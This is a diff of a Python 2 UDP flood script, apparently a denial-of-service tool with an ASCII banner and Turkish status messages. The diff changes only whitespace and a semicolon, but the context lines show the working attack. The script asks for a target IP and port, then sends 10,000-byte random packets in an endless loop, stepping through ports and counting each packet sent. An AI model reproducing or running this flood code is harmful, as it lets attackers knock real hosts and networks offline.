@@ -10,7 +10,6 @@ minute = now.minute;
 day = now.day;
 month = now.month;
 year = now.year;
-
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM);
 bytes = random._urandom(10000);
 timeout =  time.time();
@@ -25,10 +24,8 @@ print ('''
 |       ||       | _____| || |_|   ||       |  |   |  
 |______| |_______||_______||_______||_______|  |___|  
 ''');
-
 ip = raw_input("IP: ");
 port = input("Port: ");
-
 os.system("clear");
 sent = 0;
 while True:
@@ -37,7 +34,7 @@ while True:
       break;
     else:
       pass;
-    sock.sendto(bytes, (ip,port));
+    sock.sendto(bytes, (ip,port))
     sent = sent + 1;
     port = port + 1;
     print "\033[92m%s. paket, %s adresine; %s portuyla gonderildi"%(sent,ip,port)
